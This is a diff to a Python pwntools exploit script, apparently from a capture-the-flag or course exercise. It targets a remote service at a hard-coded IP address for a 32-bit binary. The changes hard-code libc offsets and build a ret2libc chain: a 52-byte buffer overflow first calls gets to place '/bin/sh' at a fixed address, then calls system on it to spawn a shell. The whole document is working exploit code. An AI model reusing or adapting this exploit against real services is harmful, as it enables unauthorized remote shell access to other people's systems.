@@ -3,6 +3,9 @@ from pwn import *
 from LibcSearcher import *
 
 WRITE_LIBC_ADDR = 0x000d43c0
+GETS_LIBC_ADDR = 0x0005e890
+SYSTEM_LIBC_ADDR = 0x0003a940
+STR_ADDR = 0x804a038
 
 #sh = process('./vul32')
 sh = remote('202.112.51.154', 20001)
@@ -34,15 +37,23 @@ print "write_addr:", write_addr
 #libc = LibcSearcher('write', write_addr)
 #libc.add_condition('write', write_addr)
 libcbase = write_addr - WRITE_LIBC_ADDR 
-system_addr = libcbase + libc.dump('system')
-binsh_addr = libcbase + libc.dump('str_bin_sh')
+system_addr = libcbase + SYSTEM_LIBC_ADDR
+gets_addr = libcbase + GETS_LIBC_ADDR
+
+print "gets /bin/sh"
+payload = flat([    \
+    'G'* 52,        \
+    gets_addr,    \
+    dovuln_addr,     \
+    STR_ADDR      
+    ])
 
 print "hacking"
 payload = flat([    \
     'G'* 52,        \
     system_addr,    \
     0xabbabaab,     \
-    binsh_addr      
+    STR_ADDR      
     ])
 
 print "now pwn"
